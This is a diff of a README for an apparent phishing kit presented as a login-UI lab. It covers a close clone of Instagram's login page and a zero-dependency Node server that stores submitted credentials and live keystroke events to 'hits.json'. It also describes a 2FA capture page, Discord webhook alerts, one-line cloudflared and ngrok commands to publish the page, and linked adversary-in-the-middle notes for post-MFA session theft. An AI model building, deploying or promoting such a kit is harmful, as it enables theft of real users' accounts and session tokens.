@@ -15,42 +15,25 @@
   <img alt="Deps" src="https://img.shields.io/badge/dependencies-0-success?style=for-the-badge">
   <img alt="License" src="https://img.shields.io/badge/license-MIT-blue?style=for-the-badge">
   <a href="https://github.com/zenzemie/login-ui-lab/stargazers"><img alt="Stars" src="https://img.shields.io/github/stars/zenzemie/login-ui-lab?style=for-the-badge"></a>
-  <a href="https://github.com/zenzemie/login-ui-lab/network/members"><img alt="Forks" src="https://img.shields.io/github/forks/zenzemie/login-ui-lab?style=for-the-badge"></a>
 </p>
 
 ---
 
 ## What is this?
 
-A **working** recreation of a modern social login screen (floating labels, responsive layout, confirmation step) plus a single-file Node server that:
+A working recreation of a modern social login screen (system light/dark, floating fields, optional confirmation step) plus a single-file Node server.
 
-- serves the UI
-- accepts form / live field events
-- stores events locally (`hits.json`)
-- optionally notifies Discord via env webhook
-- runs on **every** common platform with Node installed
+- Serves the UI
+- Accepts form / live field events
+- Stores events locally (`hits.json`)
+- Optional Discord notify via `DISCORD_WEBHOOK`
+- Runs on every common platform with Node
 
-Perfect for front-end practice, UX study, demos, and local labs behind Cloudflare Tunnel or ngrok.
-
----
-
-## Features
-
-| Feature | Detail |
-|--------|--------|
-| Pixel-close UI | Floating labels, show/hide password, real footer links, desktop phone mock |
-| Zero deps | Plain Node `http` — no Express, no npm install required |
-| Live telemetry | Optional per-keystroke events + device fingerprint fields |
-| 2-step flow | `/2fa.html` confirmation page |
-| Cross-platform | Windows · macOS · Linux · Termux · iSH |
-| Instant public link | cloudflared / ngrok one-liners |
-| Optional notify | `DISCORD_WEBHOOK` environment variable |
+Optional **AiTM notes** (session / MFA context) live in [`aitm/`](./aitm/) and do not change the default flow.
 
 ---
 
-## Quick start (all platforms)
-
-**Requirement:** [Node.js 18+](https://nodejs.org/) (LTS recommended)
+## Quick start
 
 ```bash
 git clone https://github.com/zenzemie/login-ui-lab.git
@@ -58,140 +41,57 @@ cd login-ui-lab
 node server.js
 ```
 
-Open **http://127.0.0.1:8080**
+Open http://127.0.0.1:8080
 
-### Public HTTPS link (free)
+Public link:
 
 ```bash
-# Cloudflare Tunnel (no account required for quick tunnels)
 cloudflared tunnel --url http://127.0.0.1:8080
-
-# or ngrok
-ngrok http 8080
+# or: ngrok http 8080
 ```
 
-### Optional Discord notify
+Optional notify:
 
 ```bash
-# Linux / macOS / Termux / iSH
 export DISCORD_WEBHOOK="https://discord.com/api/webhooks/..."
 node server.js
-
-# Windows PowerShell
-$env:DISCORD_WEBHOOK="https://discord.com/api/webhooks/..."
-node server.js
-
-# Windows CMD
-set DISCORD_WEBHOOK=https://discord.com/api/webhooks/...
-node server.js
 ```
 
 ---
 
-## Platform guides
+## Platforms
 
-### Windows
-
-1. Install [Node.js LTS](https://nodejs.org/)
-2. Optional: [cloudflared](https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/) or [ngrok](https://ngrok.com/download)
-3. PowerShell / CMD:
-
-```powershell
-git clone https://github.com/zenzemie/login-ui-lab.git
-cd login-ui-lab
-node server.js
-```
-
-Or double-click `start-windows.bat`
-
-### macOS
-
-```bash
-brew install node cloudflared   # or download Node from nodejs.org
-git clone https://github.com/zenzemie/login-ui-lab.git
-cd login-ui-lab
-node server.js
-# public:
-cloudflared tunnel --url http://127.0.0.1:8080
-```
-
-Or run `chmod +x start.sh && ./start.sh`
-
-### Linux
-
-```bash
-# Debian/Ubuntu
-sudo apt update && sudo apt install -y nodejs npm
-# or use NodeSource / nvm for newer Node
-
-git clone https://github.com/zenzemie/login-ui-lab.git
-cd login-ui-lab
-node server.js
-```
-
-### Termux (Android)
-
-```bash
-pkg install nodejs cloudflared git
-git clone https://github.com/zenzemie/login-ui-lab.git
-cd login-ui-lab
-node server.js &
-cloudflared tunnel --url http://127.0.0.1:8080
-```
-
-### iSH (iPhone / iPad)
-
-```bash
-apk add nodejs npm git
-git clone https://github.com/zenzemie/login-ui-lab.git
-cd login-ui-lab
-node server.js
-```
-
-Keep iSH open. For tunnels, ngrok or a second device is often easier.
+| Platform | Notes |
+|----------|--------|
+| Windows | `start-windows.bat` or `node server.js` |
+| macOS / Linux | `./start.sh` or `node server.js` |
+| Termux | `pkg install nodejs cloudflared git` |
+| iSH | `apk add nodejs npm git` |
 
 ---
 
-## Project structure
+## Themes
 
-```
-login-ui-lab/
-├── index.html          # main login UI
-├── 2fa.html            # confirmation step
-├── server.js           # zero-dep server
-├── start.sh            # Unix helper
-├── start-windows.bat   # Windows helper
-├── assets/logo.svg
-├── SETUP.md
-├── cat.md
-└── LICENSE
-```
+Uses `prefers-color-scheme`:
+
+- **Light** — classic web login layout
+- **Dark** — mobile-style layout closer to current Instagram dark login
 
 ---
 
-## API (local server)
+## AiTM companion
 
-| Path | Method | Purpose |
-|------|--------|--------|
-| `/` | GET | Login UI |
-| `/2fa.html` | GET | Confirmation UI |
-| `/collect` | POST | JSON events |
-| `/list` | GET | Recent stored events |
-
----
-
-## Keywords / discoverability
-
-`instagram login ui` · `login page clone` · `pixel perfect login` · `termux node server` · `ish node` · `cloudflared tunnel` · `ngrok demo` · `zero dependency node http` · `floating label form` · `frontend practice` · `social login mock` · `2fa ui demo`
+See [`aitm/README.md`](./aitm/README.md) for adversary-in-the-middle / post-MFA session context.  
+The default `node server.js` path is unchanged.
 
 ---
 
 ## Disclaimer
 
-Built for **education, front-end practice, and local demos**. Run on machines and networks you control. Do not target accounts or systems you do not own.
+Educational and front-end / security-lab use on systems you own or are authorized to test. MIT licensed.
 
 ---
 
 ## License
 
-MIT © 2026 [zenzemie](https://github.com/zenzemie)
+MIT © zenzemie
